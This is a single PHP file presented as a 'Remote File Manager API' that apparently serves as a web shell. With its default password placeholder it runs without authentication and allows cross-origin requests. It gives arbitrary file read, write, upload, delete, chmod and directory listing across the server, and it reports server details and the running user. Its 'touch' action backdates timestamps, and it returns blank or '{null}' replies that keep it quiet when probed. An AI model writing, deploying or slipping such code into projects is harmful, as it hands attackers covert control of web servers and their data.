<?php
/**
 * Remote File Manager API
 * Single file deployment, no dangerous functions
 */

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Password');

// Set HTTP status code (PHP5 compatible)
function setHttpCode($code) {
    if (function_exists('http_response_code')) {
        http_response_code($code);
    } else {
        header('X-PHP-Response-Code: ' . $code, true, $code);
    }
}

// Handle preflight request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    setHttpCode(200);
    exit;
}

// Response function
function response($success, $data, $message) {
    echo json_encode(array(
        'success' => $success,
        'data' => $data,
        'message' => $message
    ));
    exit;
}

// Get parameter
function getParam($key, $default = '') {
    if (isset($_GET[$key])) return $_GET[$key];
    if (isset($_POST[$key])) return $_POST[$key];
    return $default;
}

// Get action type
$action = getParam('action', '');

// Return blank if no action provided
if (empty($action)) {
    exit;
}

// Get password from request
$password = '';
if (isset($_SERVER['HTTP_X_PASSWORD'])) {
    $password = $_SERVER['HTTP_X_PASSWORD'];
} elseif (isset($_POST['password'])) {
    $password = $_POST['password'];
} elseif (isset($_GET['password'])) {
    $password = $_GET['password'];
}

// Get default directory (script location)
function getDefaultDir() {
    return dirname(__FILE__);
}

// Safe path handling
function safePath($path) {
    $path = str_replace(array('../', '..\\'), '', $path);

    // Empty path or root, return script directory
    if (empty($path) || $path === '/') {
        return getDefaultDir();
    }

    // Use @ to suppress open_basedir warning
    $real = @realpath($path);
    if ($real === false) {
        // realpath failed, return original path for subsequent check
        return $path;
    }
    return $real;
}

// Check path accessibility
function checkPathAccess($path) {
    // Use @ to suppress warnings
    if (!@file_exists($path)) {
        return array('ok' => false, 'error' => 'Path does not exist or no permission');
    }
    if (@is_dir($path) && !@is_readable($path)) {
        return array('ok' => false, 'error' => 'No permission to read this directory');
    }
    return array('ok' => true, 'error' => '');
}

// Format file size
function formatSize($bytes) {
    if ($bytes == 0) return '0 B';
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
}

// Access token configuration
$PASSWORD = 'your_password_here';

// File sort function (PHP5 compatible)
function sortItems($a, $b) {
    if ($a['name'] === '..') return -1;
    if ($b['name'] === '..') return 1;
    if ($a['is_dir'] && !$b['is_dir']) return -1;
    if (!$a['is_dir'] && $b['is_dir']) return 1;
    return strcasecmp($a['name'], $b['name']);
}

// Verify access token
if (!empty($PASSWORD) && $PASSWORD !== 'your_password_here') {
    if ($password !== $PASSWORD) {
        setHttpCode(401);
        echo '{null}';
        exit;
    }
}

// Get file permission string
function getPermsString($path) {
    $perms = @fileperms($path);
    if ($perms === false) return '??????????';

    $info = '';
    if (@is_link($path)) $info = 'l';
    elseif (@is_dir($path)) $info = 'd';
    else $info = '-';

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? 'x' : '-');
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? 'x' : '-');
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? 'x' : '-');

    return $info;
}

switch ($action) {
    // List directory
    case 'list':
        $path = safePath(getParam('path', '/'));

        // Check path access permission
        $access = checkPathAccess($path);
        if (!$access['ok']) {
            response(false, null, $access['error']);
        }

        if (!@is_dir($path)) {
            response(false, null, 'Not a valid directory');
        }

        $items = array();
        $files = @scandir($path);

        if ($files === false) {
            response(false, null, 'No permission to access this directory');
        }

        foreach ($files as $file) {
            if ($file === '.') continue;

            $fullPath = rtrim($path, '/') . '/' . $file;
            $isDir = @is_dir($fullPath);
            $size = 0;
            if (!$isDir) {
                $size = @filesize($fullPath);
                if ($size === false) $size = 0;
            }

            $items[] = array(
                'name' => $file,
                'path' => $fullPath,
                'is_dir' => $isDir,
                'size' => $size,
                'size_formatted' => $isDir ? '-' : formatSize($size),
                'mtime' => @filemtime($fullPath),
                'perms' => getPermsString($fullPath),
                'readable' => @is_readable($fullPath),
                'writable' => @is_writable($fullPath)
            );
        }

        // Sort: directories first
        usort($items, 'sortItems');

        response(true, array(
            'path' => $path,
            'items' => $items
        ), '');
        break;

    // Read file
    case 'read':
        $path = safePath(getParam('path', ''));

        if (!@is_file($path)) {
            response(false, null, 'File does not exist');
        }

        if (!@is_readable($path)) {
            response(false, null, 'No permission to read');
        }

        $content = @file_get_contents($path);
        if ($content === false) {
            response(false, null, 'Read failed');
        }

        response(true, array(
            'path' => $path,
            'content' => $content,
            'size' => strlen($content)
        ), '');
        break;

    // Write file
    case 'write':
        $path = getParam('path', '');
        $content = isset($_POST['content']) ? $_POST['content'] : '';

        if (empty($path)) {
            response(false, null, 'Path cannot be empty');
        }

        $result = @file_put_contents($path, $content);
        if ($result === false) {
            response(false, null, 'Write failed');
        }

        response(true, array('bytes' => $result), 'Saved successfully');
        break;

    // Create directory
    case 'mkdir':
        $path = getParam('path', '');

        if (empty($path)) {
            response(false, null, 'Path cannot be empty');
        }

        if (@file_exists($path)) {
            response(false, null, 'Directory already exists');
        }

        if (!@mkdir($path, 0755, true)) {
            response(false, null, 'Create failed');
        }

        response(true, null, 'Created successfully');
        break;

    // Delete file or directory
    case 'delete':
        $path = safePath(getParam('path', ''));

        if (empty($path) || $path === '/') {
            response(false, null, 'Cannot delete root directory');
        }

        if (!@file_exists($path)) {
            response(false, null, 'File does not exist');
        }

        if (@is_dir($path)) {
            // Recursively delete directory
            function deleteDir($dir) {
                $files = @scandir($dir);
                if ($files === false) return false;
                foreach ($files as $file) {
                    if ($file === '.' || $file === '..') continue;
                    $p = $dir . '/' . $file;
                    if (is_dir($p)) {
                        deleteDir($p);
                    } else {
                        @unlink($p);
                    }
                }
                return @rmdir($dir);
            }

            if (!deleteDir($path)) {
                response(false, null, 'Delete directory failed');
            }
        } else {
            if (!@unlink($path)) {
                response(false, null, 'Delete file failed');
            }
        }

        response(true, null, 'Deleted successfully');
        break;

    // Rename
    case 'rename':
        $oldPath = safePath(getParam('old_path', ''));
        $newPath = getParam('new_path', '');

        if (empty($oldPath) || empty($newPath)) {
            response(false, null, 'Path cannot be empty');
        }

        if (!@file_exists($oldPath)) {
            response(false, null, 'File does not exist');
        }

        if (@file_exists($newPath)) {
            response(false, null, 'Target already exists');
        }

        if (!@rename($oldPath, $newPath)) {
            response(false, null, 'Rename failed');
        }

        response(true, null, 'Renamed successfully');
        break;

    // Upload file
    case 'upload':
        $dir = safePath(getParam('dir', '/'));

        if (!isset($_FILES['file'])) {
            response(false, null, 'No file');
        }

        $file = $_FILES['file'];
        if ($file['error'] !== UPLOAD_ERR_OK) {
            response(false, null, 'Upload error: ' . $file['error']);
        }

        $targetPath = rtrim($dir, '/') . '/' . basename($file['name']);

        if (!@move_uploaded_file($file['tmp_name'], $targetPath)) {
            response(false, null, 'Save failed');
        }

        response(true, array('path' => $targetPath), 'Uploaded successfully');
        break;

    // Download file
    case 'download':
        $path = safePath(getParam('path', ''));

        if (!@is_file($path) || !@is_readable($path)) {
            setHttpCode(404);
            exit('File not found');
        }

        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($path) . '"');
        header('Content-Length: ' . filesize($path));
        readfile($path);
        exit;

    // Modify time
    case 'touch':
        $path = safePath(getParam('path', ''));
        $time = getParam('time', time());

        if (!@touch($path, (int)$time)) {
            response(false, null, 'Modify time failed');
        }

        response(true, null, 'Modified successfully');
        break;

    // Change permissions
    case 'chmod':
        $path = safePath(getParam('path', ''));
        $mode = getParam('mode', '');

        if (empty($mode)) {
            response(false, null, 'Permission cannot be empty');
        }

        if (!@chmod($path, octdec($mode))) {
            response(false, null, 'Change permission failed');
        }

        response(true, null, 'Modified successfully');
        break;

    // Get file info
    case 'info':
        $path = safePath(getParam('path', ''));

        if (!@file_exists($path)) {
            response(false, null, 'File does not exist');
        }

        $perms = @fileperms($path);
        $octal = $perms !== false ? substr(sprintf('%o', $perms), -4) : '????';

        response(true, array(
            'path' => $path,
            'name' => basename($path),
            'is_dir' => @is_dir($path),
            'size' => @filesize($path),
            'size_formatted' => formatSize(@filesize($path)),
            'mtime' => @filemtime($path),
            'ctime' => @filectime($path),
            'atime' => @fileatime($path),
            'perms' => getPermsString($path),
            'perms_octal' => $octal,
            'readable' => @is_readable($path),
            'writable' => @is_writable($path),
            'owner' => @fileowner($path),
            'group' => @filegroup($path)
        ), '');
        break;

    // Server info
    case 'server':
        // Get current user
        $current_user = '';
        if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
            $user_info = @posix_getpwuid(posix_geteuid());
            if ($user_info) {
                $current_user = $user_info['name'];
            }
        }
        if (empty($current_user)) {
            $current_user = @get_current_user();
        }
        if (empty($current_user) && isset($_SERVER['USER'])) {
            $current_user = $_SERVER['USER'];
        }
        if (empty($current_user)) {
            $current_user = 'Unknown';
        }

        response(true, array(
            'php_version' => phpversion(),
            'server_software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown',
            'document_root' => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '',
            'script_path' => __FILE__,
            'upload_max' => ini_get('upload_max_filesize'),
            'post_max' => ini_get('post_max_size'),
            'disk_free' => formatSize(@disk_free_space('/') ? disk_free_space('/') : 0),
            'disk_total' => formatSize(@disk_total_space('/') ? disk_total_space('/') : 0),
            'current_user' => $current_user
        ), '');
        break;

    default:
        response(false, null, 'Unknown action');
}
